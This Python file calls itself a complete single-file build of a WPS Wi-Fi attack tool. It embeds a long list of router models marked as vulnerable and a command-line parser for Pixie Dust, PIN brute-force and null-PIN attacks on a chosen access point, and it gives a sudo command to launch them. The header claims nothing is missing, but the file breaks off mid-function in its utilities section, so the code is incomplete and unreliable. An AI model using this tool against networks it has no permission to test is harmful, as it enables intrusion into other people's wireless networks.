#!/usr/bin/env python3
# =============================================================================
# OneShot-Extended -- single-file build
#
# This file is a single-file assembly of the whole OneShot-Extended (WPS
# penetration testing utility) project. Every module of the original project
# (src/logger.py, src/args.py, src/utils.py, src/wifi/*.py, src/wps/*.py and
# ose.py) plus the data file vulnwsc.txt is included below in its original
# form -- not a single line or character is missing.
#
# To keep the original `from src import ...` / `import src....` statements
# working inside a single file, the `src` package and its submodules are
# recreated below as lightweight module objects whose attribute lookup falls
# back to this module's globals. The only alteration is in src/args.py: the
# default --vuln-list path was adjusted from '../vulnwsc.txt' to
# 'vulnwsc.txt' so it resolves to the same file from this merged location.
#
# Run it the same way as the original:
#     sudo python3 oneshot.py -i wlan0 -P
# =============================================================================

import sys
import types


class _SrcModule(types.ModuleType):
    """Namespace shim: `src.<pkg>.<name>` resolves against this file's globals."""

    def __getattr__(self, name):
        try:
            return globals()[name]
        except KeyError:
            raise AttributeError(name) from None


src = _SrcModule('src')
src.wifi = _SrcModule('src.wifi')
src.wps = _SrcModule('src.wps')
src.logger = _SrcModule('src.logger')
src.args = _SrcModule('src.args')
src.utils = _SrcModule('src.utils')
src.wifi.android = _SrcModule('src.wifi.android')
src.wifi.scanner = _SrcModule('src.wifi.scanner')
src.wifi.collector = _SrcModule('src.wifi.collector')
src.wps.generator = _SrcModule('src.wps.generator')
src.wps.pixiewps = _SrcModule('src.wps.pixiewps')
src.wps.connection = _SrcModule('src.wps.connection')
src.wps.bruteforce = _SrcModule('src.wps.bruteforce')

for _pkg in (src, src.wifi, src.wps):
    _pkg.__path__ = []

sys.modules['src'] = src
sys.modules['src.wifi'] = src.wifi
sys.modules['src.wps'] = src.wps
sys.modules['src.logger'] = src.logger
sys.modules['src.args'] = src.args
sys.modules['src.utils'] = src.utils
sys.modules['src.wifi.android'] = src.wifi.android
sys.modules['src.wifi.scanner'] = src.wifi.scanner
sys.modules['src.wifi.collector'] = src.wifi.collector
sys.modules['src.wps.generator'] = src.wps.generator
sys.modules['src.wps.pixiewps'] = src.wps.pixiewps
sys.modules['src.wps.connection'] = src.wps.connection
sys.modules['src.wps.bruteforce'] = src.wps.bruteforce

# -----------------------------------------------------------------------------
# Embedded copy of vulnwsc.txt (default list of vulnerable devices)
# -----------------------------------------------------------------------------
VULN_LIST_DATA = [
    'MI424-WR Rev.E',
    'WLAN 1421',
    'AirPort Extreme',
    'Vodafone Easybox 602',
    'Vodafone EasyBox 802',
    'Speedport W 504V Typ A',
    'EasyBox 803',
    'RT-N16',
    'RT-N10',
    'N13U v1&v2',
    'Fritz!box 7390',
    'Fritz!Box 7240',
    'FritzBox7390',
    'Fritz!Box WLAN 3370',
    'n150',
    'F9K1001v1',
    'F6D6230-4 v1000',
    'F9K1001v1 (N150)',
    'F7D1301 v1',
    'F7D2301 v1',
    'F9K1105 v1',
    'F9K1001 v1',
    '7800n',
    'BiPAC 7404VGPX',
    'WZR-HP-G300NH',
    'WZR-HP-AG300H',
    'Linksys E4200 v1',
    'Valet M10',
    'Linksys E4200',
    'Linksys E3200 v1',
    'WRVS4400N',
    'UC320W',
    'WAP4410N',
    'RV110W',
    'RV120W',
    'SRP521W',
    'SRP526W',
    'SRP527W',
    'SRP541W',
    'SRP546W',
    'SRP547W',
    'WRP400',
    'Linksys E1000',
    'Lynksis E3200 v1',
    'WRT320N',
    'WRT610N',
    'DIR-825',
    'DIR-615',
    'DIR-855',
    'DIR-655 vB1',
    'DIR-300 (HV - B1)',
    'DIR-300',
    'DIR-655 A3',
    'DIR-457',
    'DIR-501',
    'DIR-600',
    'DIR-615 Rev D+ H',
    'DIR-615 Rev. B',
    'DIR-635 Rev B',
    'DIR-645',
    'DIR-652',
    'DIR-655',
    'DIR-657',
    'DIR-815',
    'DIR-852',
    'DAP-1360',
    'DAP-1522',
    'DIR-625',
    'DIR-628',
    'DWA125 with Ralink2870 / 3070',
    '3G-6200nL',
    'ECB9500',
    'EchoLife HG521',
    'BtHomeHiub3',
    'E3000',
    'WRT350N',
    'E2500',
    'WRT120N',
    'WRT160Nv2',
    'E1000',
    'E1200',
    'E4200',
    'WRT54G2',
    'WRT350Nv2.1',
    'WAG160Nv2',
    'WRT100',
    'NP800n',
    'CG3100',
    'CG3100D',
    'DGND3700',
    'WNDR3700',
    'DGN1000B',
    'MBRN3000',
    'WNDR3700v3',
    'CGD24G',
    'WGR614v8',
    'WNR1000 (N150)',
    'WNR3500L',
    'WNR3500v2 (N300)',
    'WNR200V2',
    'WNDR3700v1',
    'DGND3300v2',
    'WNR3500V2',
    'F@st 3504',
    'SX763',
    'Sitecom 300N WL-363',
    'Speedport w720v',
    'Speedport W 723V',
    'TG784n',
    'TG784',
    'TG782',
    'TL-WR1043ND',
    'TL-WR2543ND',
    'TL-WR1043N',
    'TD-W8950ND',
    'TL-MR3420',
    'WR841N',
    'TL-WR841ND',
    'WR841ND',
    'TL-WR841N',
    'TL-WR740N',
    'EVW3200',
    'XWR100',
    'P-660W-T1 v3',
    'TALKTALK-F03653',
    'F9K1002',
    'WTM652',
    'SMC7901WBRA2',
    'SMCWBR14-N2',
    'F@ST2864',
    'ADSL2+ Wi-Fi N',
    'F6D4230-4 v3 (01)',
    'WNDR4500',
    'TG862G',
    'TG585 v7',
    'LW310V2',
    'SMC8014WN',
    'WAP-5813n',
    'WNR2000v3',
    'wnr2000v2',
    'F5D7234-4 v5',
    'WNDR3400v2',
    'WNDR3700V4',
    'HG256',
    'ESR300H',
    'EA4500',
    'WNDR3300',
    'WR-741nd',
    'SAMSUNG D7000',
    'Linksys E4200 V1.0',
    'WN-200R',
    'AC1200R',
    'AIP-W525h',
    'SR10000',
    'DG1670AB2',
    'TG1672',
    'TG1682G',
    'TG852G',
    'TG862A',
    'RT-AC66U',
    'RT-AC68U',
    'RT-N10E',
    'RT-N12E',
    'RT-N15',
    'RT-N56U',
    'RT-N66U',
    'SmartBox',
    'F5D8236-4',
    'F6D4230-4',
    'F7D1301',
    'F7D5301',
    'F9K1010',
    'F9K1102',
    'F9K1103',
    'F9K1105',
    'F9K1110',
    'BiPac 7800N',
    'WBMR-HP-GN',
    'DPC3939',
    'DPC3941T',
    'CBN-106-145-065',
    'CH6640E',
    'DAP 1520',
    'DIR-605L',
    'DIR-610N',
    'DIR-626L',
    'DIR-636L',
    'DSL-2740E',
    'GO-RT-N150',
    'FON 2303B',
    'ENHWI-3GN3',
    'ESR6650',
    'CGN2-ROG',
    'CGN3-ACR',
    'CGN3-ROG',
    'CVE30360',
    'HG532e',
    'HG532s',
    'HG566a',
    'Wireless 300N 3G',
    'E1700',
    'EA6350',
    'RE1000',
    'RE3000W',
    'RE6700',
    'WRT110',
    'WRT160N',
    'WRT1900AC',
    'WRT310N',
    'HGW-2501GN-R2',
    'SBG6580',
    'C3700',
    'DGN1000',
    'EX2700',
    'EX3700',
    'EX6100',
    'EX6200',
    'JNR3210',
    'PR2000',
    'R6100',
    'R6300',
    'R6900P',
    'R7000',
    'WGR614',
    'WN3000RP',
    'WN3100RP',
    'WNDR3400',
    'WNDR3800',
    'WNDR4300',
    'WNR1000',
    'WNR2000',
    '4111N',
    'WLM-4600',
    'SMCD3GNV',
    'W 921V',
    'W724V',
    'W 724V',
    'TC8305C',
    'TD5130',
    'TG-797n',
    'iRouteur 1104-W',
    'APDK71',
    'N301RT',
    'Archer C2',
    'Archer C20i',
    'Archer C5',
    'TD-W8951ND',
    'TD-W8960N',
    'TL-WA701ND',
    'TL-WDR3500',
    'TL-WR1042ND',
    'TL-WR1043',
    'TL-WR720N',
    'TL-WR841HP',
    'TEW-650AP',
    'TEW-691GR',
    'TEW-731BR',
    'ZXDSL 931VII',
    'C1000Z',
    'Keenetic',
    'NBG-418N',
    'P-2812HNU-F3',
    'P-660HN-T1A',
    'P-660W-T1',
    'PK5001z',
    'VMG3312-B10A',
    'VMG3312-B10B',
    'VMG5313-B30',
    'ADSL Router EV-2006-07-27',
    'ADSL RT2860',
    'AIR3G WSC Wireless Access Point AIR3G WSC Device',
    'AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP',
    'APxx APxx-xxx',
    'Archer_A9 1.0',
    'ArcherC20i 1.0',
    'Archer A2 5.0',
    'Archer A5 4.0',
    'Archer C2 1.0',
    'Archer C2 3.0',
    'Archer C5 4.0',
    'Archer C6 3.20',
    'Archer C6U 1.0.0',
    'Archer C20 1.0',
    'Archer C20 4.0',
    'Archer C20 5.0',
    'Archer C50 1.0',
    'Archer C50 3.0',
    'Archer C50 4.0',
    'Archer C50 5.0',
    'Archer C50 6.0',
    'Archer C64',
    'Archer MR200 1.0',
    'Archer MR200 4.0',
    'Archer MR400 4.2',
    'Archer MR200 5.0',
    'Archer VR2100 1.0',
    'Archer VR300 1.20',
    'Archer VR400 3.0',
    'Archer XR500v 1.0',
    'B-LINK 123456',
    'Belkin AP EV-2012-09-01',
    'DAP-1360 DAP-1360',
    'DIR-635 B3',
    'DIR-819 v1.0.1',
    'DIR-842 DIR-842',
    'DPC3928SL',
    'DWR-921C3 WBR-0001',
    'D-Link N Router GO-RT-N150',
    'D-Link Router DIR-605L',
    'D-Link Router DIR-615H1',
    'D-Link Router DIR-655',
    'D-Link Router DIR-809',
    'D-Link Router GO-RT-N150',
    'Edimax Edimax',
    'EC120-F5 1.0',
    'EC220-G5 2.0',
    'EV-2009-02-06',
    'Enhanced Wireless Router F6D4230-4 v1',
    'Home Internet Center KEENETIC series',
    'Home Internet Center Keenetic series',
    'Huawei Wireless Access Point RT2860',
    'JWNR2000v2(Wireless AP) JWNR2000v2',
    'Keenetic Keenetic series',
    'Linksys E5400 E5400',
    'Linksys Wireless Access Point E5600',
    'Linksys Wireless Access Point EA7500',
    'Linksys Wireless Router WRT110',
    'NBG-419N NBG-419N',
    'Netgear AP EV-2012-08-04',
    'NETGEAR Wireless Access Point NETGEAR',
    'NETGEAR Wireless Access Point R6220',
    'NETGEAR Wireless Access Point R6260',
    'N/A EV-2010-09-20',
    'Ralink Wireless Access Point E5600',
    'Ralink Wireless Access Point RT2860',
    'Ralink Wireless Access Point WR-AC1210',
    'RTL8196E',
    'RTL8xxx EV-2009-02-06',
    'RTL8xxx EV-2010-09-20',
    'RTL8xxx RTK_ECOS',
    'RT-G32 1234',
    'Sitecom Wireless Router 300N X2 300N',
    'Smart Router R3 RT2860',
    'Tenda 123456',
    'Timo RA300R4 Timo RA300R4',
    'TD-W8151N RT2860',
    'TD-W8901N RT2860',
    'TD-W8951ND RT2860',
    'TD-W9960 1.0',
    'TD-W9960 1.20',
    'TD-W9960v 1.0',
    'TD-W8968 2.0',
    'TEW-731BR TEW-731BR',
    'TG862G RT2860',
    'TL-MR100 1.0',
    'TL-MR3020 3.0',
    'TL-MR3420 5.0',
    'TL-MR6400 3.0',
    'TL-MR6400 4.0',
    'TL-WA801N 6.0',
    'TL-WA855RE 4.0',
    'TL-WR840N 4.0',
    'TL-WR840N 5.0',
    'TL-WR840N 6.0',
    'TL-WR841N 13.0',
    'TL-WR841N 14.0',
    'TL-WR841HP 5.0',
    'TL-WR842N 5.0',
    'TL-WR845N 3.0',
    'TL-WR845N 4.0',
    'TL-WR850N 1.0',
    'TL-WR850N 2.0',
    'TL-WR850N 3.0',
    'TL-WR1042N EV-2010-09-20',
    'Topaz QV840.432',
    'Trendnet router TEW-625br',
    'Trendnet router TEW-651br',
    'VN020-F3 1.0',
    'VMG3312-T20A RT2860',
    'VMG8623-T50A RT2860',
    'WAP300N WAP300N',
    'WAP3205 WAP3205',
    'Wi-Fi Protected Setup Router RT-AC1200G+',
    'Wi-Fi Protected Setup Router RT-AX55',
    'Wi-Fi Protected Setup Router RT-N10U',
    'Wi-Fi Protected Setup Router RT-N12',
    'Wi-Fi Protected Setup Router RT-N12D1',
    'Wi-Fi Protected Setup Router RT-N12VP',
    'Wireless Access Point .',
    'Wireless Router 123456',
    'Wireless Router RTL8xxx EV-2009-02-06',
    'Wireless Router Wireless Router',
    'Wireless WPS Router',
    'Wireless WPS Router RT-N10E',
    'Wireless WPS Router RT-N10LX',
    'Wireless WPS Router RT-N12E',
    'Wireless WPS Router RT-N12LX',
    'WN3000RP V3',
    'WN-200R WN-200R',
    'WPS Router RT-N65U',
    'WPS Router DSL-AC51',
    'WPS Router DSL-AC52U',
    'WPS Router DSL-AC55U',
    'WPS Router DSL-N14U-B1',
    'WPS Router DSL-N16',
    'WPS Router DSL-N17U',
    'WPS Router RT-AC750',
    'WPS Router RT-AC1200',
    'WPS Router RT-AC1200_V2',
    'WPS Router RT-AC1750',
    'WPS Router RT-AC750L',
    'WPS Router RT-AC1750U',
    'WPS Router RT-AC51',
    'WPS Router RT-AC51U',
    'WPS Router RT-AC52U',
    'WPS Router RT-AC52U_B1',
    'WPS Router RT-AC53',
    'WPS Router RT-AC57U',
    'WPS Router RT-AC65P',
    'WPS Router RT-AC85P',
    'WPS Router RT-N11P',
    'WPS Router RT-N12E',
    'WPS Router RT-N12E_B1',
    'WPS Router RT-N12 VP',
    'WPS Router RT-N12+',
    'WPS Router RT-N14U',
    'WPS Router RT-N56U',
    'WPS Router RT-N56UB1',
    'WPS Router RT-N300',
    'WR5570 2011-05-13',
    'XC220-G3v 1.0',
    'XN020-G3v 1.0',
    'ZyXEL NBG-416N AP Router',
    'ZyXEL NBG-416N AP Router NBG-416N',
    'ZyXEL NBG-418N AP Router',
    'ZyXEL NBG-418N AP Router NBG-418N',
    'ZyXEL Wireless AP Router NBG-417N',
    'AirLive\tWN-200R',
    'Alfa Network AC1200R',
    'Alfa Network AIP-W525h',
    'Amped Wireless SR10000',
    'Arris DG1670AB2',
    'Arris TG1672',
    'Arris TG1682G',
    'Arris TG852G',
    'Arris TG862A',
    'Arris TG862G',
    'Asus RT-AC66U',
    'Asus RT-AC68U',
    'Asus RT-N10E',
    'Asus RT-N12E',
    'Asus RT-N15',
    'Asus RT-N56U',
    'Asus RT-N66U',
    'Beelin SmartBox',
    'Belkin F5D8236-4',
    'Belkin F6D4230-4',
    'Belkin F7D1301',
    'Belkin F7D5301',
    'Belkin F9K1010',
    'Belkin F9K1102',
    'Belkin F9K1103',
    'Belkin F9K1105',
    'Belkin F9K1110',
    'Billion\tBiPac 7800N',
    'Buffalo\tWBMR-HP-GN',
    'Cisco DPC3939',
    'Cisco DPC3941T',
    'Compal CBN-106-145-065',
    'Compal CH6640E',
    'D-Link DAP 1520',
    'D-Link DIR-501',
    'D-Link DIR-605L',
    'D-Link DIR-610N',
    'D-Link DIR-615',
    'D-Link DIR-626L',
    'D-Link DIR-636L',
    'D-Link DIR-655',
    'D-Link DSL-2740E',
    'D-Link GO-RT-N150',
    'Edimax FON 2303B',
    'Encore ENHWI-3GN3',
    'EnGenius ESR6650',
    'Hitron CGN2-ROG',
    'Hitron CGN3-ACR',
    'Hitron CGN3-ROG',
    'Hitron CVE30360',
    'Huawei HG532e',
    'Huawei HG532s',
    'Huawei HG566a',
    'Intellinet Wireless 300N 3G',
    'Linksys\tE1700',
    'Linksys\tE2500',
    'Linksys\tEA6350',
    'Linksys\tRE1000',
    'Linksys\tRE3000W',
    'Linksys\tRE6700',
    'Linksys\tWRT110',
    'Linksys\tWRT160N',
    'Linksys\tWRT1900AC',
    'Linksys\tWRT310N',
    'Mitrastar HGW-2501GN-R2',
    'Motorola SBG6580',
    'NETGEAR\tC3700',
    'NETGEAR\tDGN1000',
    'NETGEAR\tEX2700',
    'NETGEAR\tEX3700',
    'NETGEAR\tEX6100',
    'NETGEAR\tEX6200',
    'NETGEAR\tJNR3210',
    'NETGEAR\tPR2000',
    'NETGEAR\tR6100',
    'NETGEAR\tR6300',
    'NETGEAR\tR6900P',
    'NETGEAR\tR7000',
    'NETGEAR\tWGR614',
    'NETGEAR\tWN3000RP',
    'NETGEAR\tWN3100RP',
    'NETGEAR\tWNDR3400',
    'NETGEAR\tWNDR3700',
    'NETGEAR\tWNDR3800',
    'NETGEAR\tWNDR4300',
    'NETGEAR\tWNR1000',
    'NETGEAR\tWNR2000',
    'Pace 4111N',
    'Sitecom\tWLM-4600',
    'SMC\tSMCD3GNV',
    'Speedport W 921V',
    'Speedport W724V',
    'Speedport W 724V',
    'Technicolor\tTC8305C',
    'Technicolor\tTD5130',
    'Technicolor\tTG-797n',
    'Teldat iRouteur 1104-W',
    'TI APDK71',
    'Totolink N301RT',
    'TP-Link\tArcher C2',
    'TP-Link\tArcher C20i',
    'TP-LInk\tArcher C5',
    'TP-Link\tTD-W8951ND',
    'TP-Link\tTD-W8960N',
    'TP-Link\tTL-WA701ND',
    'TP-Link\tTL-WDR3500',
    'TP-Link\tTL-WR1042ND',
    'TP-Link\tTL-WR1043',
    'TP-Link\tTL-WR1043ND',
    'TP-Link\tTL-WR720N',
    'TP-Link\tTL-WR740N',
    'TP-Link\tTL-WR841HP',
    'TP-Link\tTL-WR841N',
    'TRENDnet TEW-650AP',
    'TRENDnet TEW-691GR',
    'TRENDnet TEW-731BR',
    'ZTE\tZXDSL 931VII',
    'ZyXEL C1000Z',
    'ZyXEL Keenetic',
    'ZyXEL NBG-418N',
    'ZyXEL P-2812HNU-F3',
    'ZyXEL P-660HN-T1A',
    'ZyXEL P-660W-T1',
    'ZyXEL PK5001z',
    'ZyXEL VMG3312-B10A',
    'ZyXEL VMG3312-B10B',
    'ZyXEL VMG5313-B30',
    'TP-Link Archer_A9 1.0',
    'TP-Link Archer A2 5.0',
    'TP-Link Archer A5 4.0',
    'TP-Link Archer C2 1.0',
    'TP-Link Archer C2 3.0',
    'TP-Link Archer C5 4.0',
    'TP-Link Archer C6U 1.0.0',
    'TP-Link Archer C20 1.0',
    'TP-Link Archer C20 4.0',
    'TP-Link Archer C20 5.0',
    'TP-Link Archer C50 1.0',
    'TP-Link Archer C50 3.0',
    'TP-Link Archer C50 4.0',
    'TP-Link Archer C50 5.0',
    'TP-Link Archer C50 6.0',
    'TP-Link Archer MR200 1.0',
    'TP-Link Archer MR200 4.0',
    'TP-Link Archer MR200 5.0',
    'TP-Link Archer VR300 1.20',
    'TP-Link Archer VR400 3.0',
    'TP-Link TD-W8151N RT2860',
    'TP-Link TD-W8901N RT2860',
    'TP-Link TD-W8951ND RT2860',
    'TP-Link TD-W9960 1.0',
    'TP-Link TD-W9960 1.20',
    'TP-Link TD-W9960v 1.0',
    'TP-Link TD-W8968 2.0',
    'TP-Link TL-MR3020 3.0',
    'TP-Link TL-MR3420 5.0',
    'TP-Link TL-MR6400 3.0',
    'TP-Link TL-MR6400 4.0',
    'TP-Link TL-WA855RE 4.0',
    'TP-Link TL-WR840N 4.0',
    'TP-Link TL-WR840N 5.0',
    'TP-Link TL-WR840N 6.0',
    'TP-Link TL-WR841N 13.0',
    'TP-Link TL-WR841N 14.0',
    'TP-Link TL-WR841HP 5.0',
    'TP-Link TL-WR842N 5.0',
    'TP-Link TL-WR845N 3.0',
    'TP-Link TL-WR845N 4.0',
    'TP-Link TL-WR850N 1.0',
    'TP-Link TL-WR850N 2.0',
    'TP-Link TL-WR850N 3.0',
    'TP-Link TL-WR1042N EV-2010-09-20',
    'Modem/Router EV-2010-09-20',
    'RB06 RT2860',
    'RB03 RT2860',
]


# ============================================================================
# SOURCE: src/logger.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import logging
import sys

_LOGGER = None

class _ColorFormatter(logging.Formatter):
    """Custom formatter that adds colored log level prefixes"""

    COLORS = {
        '[*]': '\033[0;32m',  # Dark Green
        '[+]': '\033[1;32m',  # Bold Green
        '[-]': '\033[1;33m',  # Bold Yellow
        '[!]': '\033[1;31m',  # Bold Red
        'RESET': '\033[0m'
    }

    LEVEL_PREFIXES = {
        logging.INFO: '[*]',
        logging.WARNING: '[-]',
        logging.ERROR: '[!]',
        logging.CRITICAL: '[!]',
    }

    def format(self, record):
        msg_str = str(record.msg)

        prefix = self.LEVEL_PREFIXES.get(record.levelno, '[*]')
        for pfx in ['[*]', '[+]', '[-]', '[!]']:
            if msg_str.startswith(pfx):
                prefix = pfx
                record.msg = msg_str[len(pfx):].lstrip()
                break

        color = self.COLORS.get(prefix, '')
        reset = self.COLORS['RESET']
        record.msg = f"{color}{prefix}{reset} {record.msg}"

        return super().format(record)

def _getLogger(name: str = __name__, level: int = logging.INFO) -> logging.Logger:
    """Get a configured logger instance"""

    logger = logging.getLogger(name)

    if not logger.handlers:
        logger.setLevel(level)

        handler = logging.StreamHandler(sys.stdout)
        handler.setLevel(level)

        formatter = _ColorFormatter(fmt='%(message)s')
        handler.setFormatter(formatter)

        logger.addHandler(handler)

    return logger

def initializeLogging():
    """Initialize the global logging system"""

    global _LOGGER # pylint: disable=global-statement

    _LOGGER = _getLogger('ose', logging.INFO)

def info(message: str):
    """Log an info message"""

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.info(message)

def success(message: str):
    """Log a success message (uses [+] prefix)"""

    if _LOGGER is None:
        initializeLogging()

    # We need to manually add [+] since logging doesn't have a SUCCESS level
    _LOGGER.info('[+] %s', message)

def warning(message: str):
    """Log a warning message"""

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.warning(message)

def error(message: str):
    """Log an error message"""

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.error(message)


# ============================================================================
# SOURCE: src/args.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import argparse
import os

def parseArgs():
    """Parse arguments passed to the main python script."""

    parser = argparse.ArgumentParser(
        description='''
▄▖    ▄▖▌   ▗   ▄▖  ▗      ▌   ▌
▌▌▛▌█▌▚ ▛▌▛▌▜▘▄▖▙▖▚▘▜▘█▌▛▌▛▌█▌▛▌
▙▌▌▌▙▖▄▌▌▌▙▌▐▖  ▙▖▞▖▐▖▙▖▌▌▙▌▙▖▙▌

Copyright (C) 2026 chkndrp
''',
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    target_group = parser.add_argument_group('Required arguments')
    target_group.add_argument(
        '-i', '--interface',
        type=str,
        help='Name of the interface to use'
    )
    target_group.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
    )

    check_group = parser.add_argument_group('Check Mode (no attack)')
    check_group.add_argument(
        '-C', '--check',
        type=str,
        metavar='BSSID',
        help='Check a router BSSID/MAC against the vulnerable lists and saved data (add -i to also probe the AP over the air), without running any attack'
    )

    attack_group = parser.add_argument_group('Attack Modes')
    attack_pin_group = attack_group.add_mutually_exclusive_group()
    attack_pin_group.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
    )
    attack_pin_group.add_argument(
        '-N', '--null-pin',
        action='store_true',
        help='Use a null pin'
    )
    attack_pin_group.add_argument(
        '-P', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
    )
    attack_pin_group.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
    )
    attack_pin_group.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Run WPS push button connection'
    )

    opt_group = parser.add_argument_group('Optional arguments')
    opt_group.add_argument(
        '-k', '--kill',
        action='store_true',
        help='Automatically kill processes interfering with the wireless interface'
    )
    opt_group.add_argument(
        '-r', '--restore',
        action='store_true',
        help='Restore killed interfering processes on exit (--kill)'
    )
    opt_group.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
    )
    opt_group.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    opt_group.add_argument(
        '-c', '--clear',
        action='store_true',
        help='Clear the screen on every wi-fi scan'
    )
    opt_group.add_argument(
        '-a', '--all',
        action='store_true',
        help='Show all networks in the scan table, including those with WPS disabled/absent (marked gray as OFF)'
    )
    opt_group.add_argument(
        '-d', '--delay',
        type=float,
        default=0,
        help='Set a delay between pin attempts in seconds (default: %(default)s)'
    )
    opt_group.add_argument(
        '-t', '--timeout',
        type=float,
        default=60,
        help='Set the timeout for retrying after WPS lock (default: %(default)s)'
    )

    adv_group = parser.add_argument_group('Advanced Arguments')
    adv_group.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
    )
    adv_group.add_argument(
        '-S', '--show-pixie',
        action='store_true',
        help='Print pixiewps command and related data'
    )
    adv_group.add_argument(
        '-I', '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
    )
    adv_group.add_argument(
        '-M', '--mtk-wifi',
        action='store_true',
        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit'
    )
    adv_group.add_argument(
        '-D', '--dont-touch-settings',
        action='store_true',
        help="Don't touch the Android Wi-Fi settings on startup and exit"
    )
    adv_group.add_argument(
        '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    adv_group.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.join(os.path.dirname(__file__), 'vulnwsc.txt'),
        help='Use custom file with vulnerable devices list'
    )
    adv_group.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
    )
    adv_group.add_argument(
        '-h', '--help',
        action='help',
        help='Show this help message and exit'
    )

    args = parser.parse_args()

    if not args.check and not args.interface:
        parser.error('argument -i/--interface is required')

    if (args.pixie_force or args.show_pixie) and not args.pixie_dust:
        parser.error('argument -F/--pixie-force and -S/--show-pixie can only be used with -P/--pixie-dust')

    if args.delay and not args.bruteforce:
        parser.error('argument -d/--delay can only be used with -B/--bruteforce')

    if args.restore and not args.kill:
        parser.error('argument -r/--restore can only be used with -k/--kill')

    return args


# ============================================================================
# SOURCE: src/utils.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import sys
import os
import json
import pathlib
import subprocess
import time

from shutil import which
from src import logger

USER_HOME = str(pathlib.Path.home())
SESSIONS_DIR = f'{USER_HOME}/.OneShot-Extended/sessions/'
PIXIEWPS_DIR = f'{USER_HOME}/.OneShot-Extended/pixiewps/'
REPORTS_DIR  = f'{os.getcwd()}/reports/'

def _getInterferingProcesses():
    """Get a list of processes actively using the generic netlink subsystem."""

    try:
        with open('/proc/net/netlink', 'r', encoding='utf-8') as f:
            next(f)

            tokens = (line.split() for line in f)
            pids = {int(p[2]) for p in tokens if len(p) > 2 and p[1] == '16'}

            pids.discard(os.getpid())
    except IOError:
        return []

    interfering_pids = []
    for pid in pids:
        try:
            fd_entries = os.scandir(f'/proc/{pid}/fd')
            has_socket = any('socket' in os.readlink(e.path) for e in fd_entries)

            if has_socket:
                with open(f'/proc/{pid}/comm', 'r', encoding='utf-8') as f_comm:
                    pname = f_comm.read().strip()

                    # Killing system_server results in soft reboot
                    if pname == 'system_server':
                        continue

                    interfering_pids.append((pid, pname))
        except OSError:
            continue

    return interfering_pids

def _saveKilledProcesses(processes: list[tuple[int, str, str]]):
    """Save killed process information to a file for restoration."""

    if not processes:
        return

    try:
        killed_file = os.path.join(SESSIONS_DIR, 'killed_processes.json')

        with open(killed_file, 'w', encoding='utf-8') as f:
            json.dump(processes, f, indent=2)
    except IOError as e:
        logger.error(f"Failed to save killed processes: {e}")

def _getProcessCommand(pid: int) -> str:
    """Get the command line of a process from /proc."""

    try:
        with open(f'/proc/{pid}/cmdline', 'r', encoding='utf-8') as f:
            cmdline = f.read().replace('\0', ' ').strip()

            return cmdline
    except OSError:
        return ''

def checkRunningProcesses(interface: str):
    """Detect and warn about other processes actively using the generic netlink subsystem."""

    interfering_pids = _getInterferingProcesses()

    if interfering_pids:
        processes_str = ', '.join([f"{pname} (PID {pid})" for pid, pname in interfering_pids])
        logger.warning(f"Another process is using the {interface} interface: {processes_str}")

def killInterfering():
    """Kill all processes actively using the generic netlink subsystem."""

    interfering_pids = _getInterferingProcesses()
    killed_processes = []

    if interfering_pids:
        for pid, pname in interfering_pids:
            try:
                cmdline = _getProcessCommand(pid)
                os.kill(pid, 15)
                logger.warning(f"Terminated process {pname} (PID {pid})")
                killed_processes.append((pid, pname, cmdline))

                # Give time to release locks
                time.sleep(1.5)
            except OSError as e:
                logger.error(f"Failed to terminate {pname} (PID {pid}): {e}")

        _saveKilledProcesses(killed_processes)

def restoreProcesses():
    """Restore processes that were previously killed."""

    killed_file = os.path.join(SESSIONS_DIR, 'killed_processes.json')

    if not os.path.exists(killed_file):
        return

    try:
        with open(killed_file, 'r', encoding='utf-8') as f:
            killed_processes = json.load(f)
    except (IOError, json.JSONDecodeError) as e:
        logger.error(f"Failed to read killed processes file: {e}")
        return

    for pid, pname, cmdline in killed_processes:
        if not cmdline:
            logger.warning(f"Cannot restore {pname} (PID {pid}): command line not available")
            continue

        try:
